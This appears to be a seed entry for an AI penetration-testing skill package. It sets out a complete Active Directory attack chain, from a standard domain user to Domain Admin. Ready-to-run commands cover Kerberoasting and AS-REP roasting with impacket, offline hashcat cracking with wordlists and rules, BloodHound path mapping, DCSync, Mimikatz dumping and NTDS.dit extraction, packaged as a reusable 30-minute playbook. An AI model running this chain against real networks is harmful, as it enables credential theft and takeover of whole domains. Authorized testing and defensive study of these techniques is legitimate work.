# [Seed] Kerberoasting → Offline Cracking → DA

## Scenario Classification
Penetration Testing / Active Directory (AD) Attacks

## Objective Overview
Having obtained credentials for an ordinary domain user, identify service accounts configured with SPNs in the target domain, perform Kerberoasting to extract TGS hashes for offline cracking, and use the cracked plaintext password with BloodHound to map an attack path directly to Domain Admin (DA).

## Full Execution Chain

1. Establish domain foothold (any standard user, local administrator privileges not required).
2. Enumerate SPNs:
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. Identify accounts configured with SPNs (typically SQL Server, IIS, or custom service accounts).
4. Crack offline:
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Crack the target service account password → Query BloodHound for attack paths accessible by this account.
6. If the account belongs to a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → Execute DCSync directly.
7. If not in a Tier 0 group but possesses RDP/WinRM access to a critical machine → Access the host, dump credentials with Mimikatz, and execute chained exploitation to DA.

## Pitfalls & Troubleshooting

| Issue | Cause | Solution | Time Spent |
|---|---|---|---|
| GetUserSPNs returns no results | Current user lacks permissions to read SPNs | Any standard domain user can read SPNs; verify if `-dc-ip` is incorrect or PreAuth failed | 20min |
| Cracking yields no results after several hours | High password complexity | 1) Change wordlist (rockyou.txt + corp keywords); 2) Enable GPU (`hashcat -d 1`); 3) Apply the `OneRuleToRuleThemAll` rule set | Several hours |
| Login fails after obtaining password | Credentials expired or case-sensitive | Validate first using NetExec: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | Missing GPO/ACL data during collection | `bloodhound-python -c All` must specify `All`; use `--zip` for BHCE | 30min |
| AS-REP Roasting found no targets | Few accounts have "Do not require Kerberos preauth" enabled | Run `GetNPUsers.py` separately: `-usersfile users.txt -no-pass` | 15min |

## Toolchain Insights

- **impacket-GetUserSPNs** has become the de facto standard, offering better cross-platform compatibility than PowerView.
- **netexec (nxc)** is the successor to CrackMapExec; fast execution with built-in modules such as `spider_plus`, `lsassy`, and `ntds`.
- **BloodHound Community Edition (BHCE)** is the modern version, substantially faster than legacy BloodHound.
- **OneRuleToRuleThemAll** rule set provides the highest effectiveness for password cracking.
- **bloodyAD** is an emerging AD tool specialized in privilege escalation via ACL abuse from low-privileged accounts.

## Key Code / Commands

Complete Kerberoasting workflow:

```bash
# 1. Validate credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. Opportunistic AS-REP Roasting
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Offline cracking
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. Collect BloodHound data after obtaining credentials
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Attack path analysis: Mark svc account as Owned and inspect "Shortest Path to DA"
```

If the service account possesses `SeBackupPrivilege` on a DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# Directly dump NTDS.dit
```

## Improvement Suggestions for this Package

- Add a dedicated Kerberoasting section in `skill://webapp-pentest-tools/references/network-attack-defense.md`.
- BloodHound CE is now standard; update `bootstrap-manifest` to explicitly install `bloodhound-ce-cli`.
- Add AD cheatsheet covering the 6 major AD attacks on a single page (Kerberoasting, AS-REP, DCSync, DCShadow, Constrained Delegation, Resource-Based Constrained Delegation, ESC1-ESC15).

## Reusable Patterns / Script Snippets

**Standard 30-Minute Playbook After Domain Foothold**:

```text
1. Validate credentials via nxc smb + automatically spider shares
2. Execute GetUserSPNs + GetNPUsers simultaneously
3. Run bloodhound-python -c All data collection
4. Concurrently run offline cracking (keep GPU running)
5. Review BloodHound for Tier 0 / Pre-built attack paths while waiting
6. Cracked password → Mark as Owned → Recalculate attack paths
```

**AD Kerberos Hashcat Mode Quick Reference**:

| Mode | Purpose |
|------|---------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (Captured via Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution Tasks
- [ ] Add AD cheatsheet
- [ ] Verify tool-index status for `nxc` / `bloodhound-ce` / `bloodyAD`
- [x] Routing matrix includes Kerberos / Kerberoasting

## Environment Information
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, Forest Functional Level 2016+
- Attack Location: Any foothold inside the domain (standard domain user)

## Sanitization Requirements
This entry is seed data written based on public AD attack methodology patterns; it does not involve any real-world target domains.